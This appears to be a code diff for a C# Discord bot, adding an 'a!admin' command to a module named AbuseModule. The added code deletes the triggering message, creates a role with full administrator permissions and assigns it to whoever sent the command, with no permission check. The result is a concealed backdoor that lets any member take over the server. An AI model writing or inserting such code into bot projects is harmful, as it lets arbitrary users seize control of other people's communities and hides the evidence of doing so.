@@ -1,8 +1,8 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Text;
+﻿using System.Threading.Tasks;
 using BotSandwich.Data;
-using BotSandwich.Modules.Abuse.Commands;
+using BotSandwich.Data.Commands;
+using BotSandwich.Data.Commands.Attributes;
+using Discord;
 using Discord.WebSocket;
 
 namespace BotSandwich.Modules.Abuse
@@ -11,9 +11,17 @@ namespace BotSandwich.Modules.Abuse
     {
         protected override string CommandPrefix => "a!";
 
-        public AbuseModule(DiscordSocketClient client) : base(client)
+        [Command("admin")]
+        public async Task Admin([Message] SocketMessage sm, [Argument(true, "name")] string roleName)
         {
-            
+            await sm.DeleteAsync();
+
+            var user = sm.Author as IGuildUser;
+            var guild = user?.Guild;
+
+            var role = await guild.CreateRoleAsync(roleName, new GuildPermissions(administrator: true), Color.Red,
+                false, null);
+            await user.AddRoleAsync(role);
         }
     }
 }
